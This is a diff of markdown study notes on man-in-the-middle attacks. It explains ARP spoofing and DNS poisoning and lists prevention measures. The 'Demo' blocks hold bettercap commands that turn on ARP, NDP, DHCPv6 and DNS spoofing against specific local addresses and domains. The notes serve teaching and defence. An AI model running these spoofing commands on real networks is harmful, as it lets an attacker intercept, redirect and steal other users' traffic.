@@ -121,6 +121,44 @@ set wifi.ap.channel 5
 set wifi.ap.encryption false
 wifi.recon on; wifi.ap
 
+```
+
+# ARP spoofing attack
+
+- ARP: Address Resolution Protocol
+- A type of MitM attack
+
+## How ARP Works
+- ARP Basics:
+    - ARP is used to map an IP address to a MAC address within a local network
+    - When a device wants to communicate with another, it broadcasts an ARP request: "Who has IP 192.168.1.1? Tell me your MAC address."
+    - The device with the corresponding IP replies with its MAC address
+- Normal Communication:
+    - Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses
+
+## How ARP Spoofing Works
+- The attacker sends forged ARP replies to the victim device and/or the router, claiming:
+    - "I am the router (192.168.1.1)" to the victim
+    - "I am the victim (192.168.1.100)" to the router
+- Both the victim and the router update their ARP tables with the attacker's MAC address for the claimed IP
+- As a result:
+    - All traffic from the victim to the router (and vice versa) flows through the attacker
+    - The attacker becomes a "man-in-the-middle" (MITM), able to intercept or modify traffic
+
+## Diagram
+Normal Traffic:
+Victim → Router → Internet
+
+ARP Spoofing:
+Victim → Attacker → Router → Internet
+
+## Prevention
+- Static ARP Entries: Manually map critical IPs to MAC addresses to prevent changes
+- Use Encryption: Secure protocols (e.g., HTTPS, SSH, VPN) ensure data confidentiality even if traffic is intercepted
+- Enable Dynamic ARP Inspection (DAI): On managed switches, DAI verifies ARP packets against a trusted database
+
+## Demo
+```sh
 
 # Fake dns
 sudo bettercap -iface wlo1
@@ -133,7 +171,7 @@ set arp.spoof.targets 192.168.1.9
 set dns.spoof.domains alo1411.team
 
 arp.spoof on
-# E.g output
+# -> Output
 [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets
 
 dns.spoof on
@@ -141,6 +179,44 @@ dns.spoof on
 [sys.log] [inf] dns.spoof alo1411.team -> 192.168.1.17
 
 net.sniff
+```
+
+
+# DNS Poisoning
+
+- A type of MitM attack
+
+
+## Prevention
+
+- Use Secure DNS: Configure DNS servers to use DNSSEC (Domain Name System Security Extensions), which adds cryptographic signatures to DNS records
+- Enable HTTPS Everywhere: Even if DNS is poisoned, HTTPS with valid certificates will warn users when a site is untrusted
+- Avoid Public Wi-Fi: Public networks are more susceptible to DNS poisoning attacks
+- Set Trusted DNS Servers: Use reliable DNS resolvers like Google DNS (8.8.8.8) or Cloudflare (1.1.1.1)
+- Monitor and Update Systems: Regularly patch DNS servers and network devices to address vulnerabilities
+- Use a VPN: Encrypt traffic, bypassing rogue DNS responses on compromised networks
+
+## Demo
+
+```sh
+
+set ndp.spoof.neighbour fe80::53a:d4db:13e9:b774
+set ndp.spoof.targets 2001:ee0:4f51:2ed0:295c:1995:43bf:3e1b,2001:ee0:4f51:2ed0:c60d:3bd1:19b6:facb
+
+2001:ee0:4f51:2ed0:ed4b:6d8:6bd0:b97f
+
+set dns.spoof.domains mnptt.io.vn
+set dns.spoof.address 192.168.1.17
+
+set dhcp6.spoof.domains mnptt.io.vn
+
+set arp.spoof.targets a4:34:d9:89:a0:58
+
+ndp.spoof on
+dhcp6.spoof on
+dns.spoof on
+arp.spoof on
+
 ```
 
 ## References
